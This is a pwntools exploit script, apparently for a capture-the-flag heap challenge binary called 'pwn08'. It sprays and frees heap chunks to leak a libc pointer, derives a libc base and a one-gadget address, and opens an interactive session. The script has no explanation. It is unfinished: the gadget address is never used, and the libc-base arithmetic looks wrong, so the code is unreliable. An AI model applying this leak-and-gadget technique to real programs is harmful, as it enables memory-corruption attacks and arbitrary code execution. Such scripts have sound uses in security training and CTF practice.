from pwn import *
p = process("./pwn08")
pause()
elf = ELF("./pwn08")
libc = elf.libc

def add(idx, size):
    p.sendlineafter("command?: ", "1")
    p.sendlineafter("index?[0-9]: ", str(idx))
    p.sendlineafter("size?: ", str(size))

def delete(idx):
    p.sendlineafter("command?: ", "9")
    p.sendlineafter("index?[0-9]: ", str(idx))

for i in range(0, 10):
    add(i, 2048)

for i in range(0, 10):
    delete(i)

add(0, 2048)
p.recvuntil("***** 0 *****\n")
leak = (u64(p.recv(6) + "\x00\x00"))
libc_base = leak - 96 - 16
oneshot = libc_base + 0x4f3d5

p.interactive()
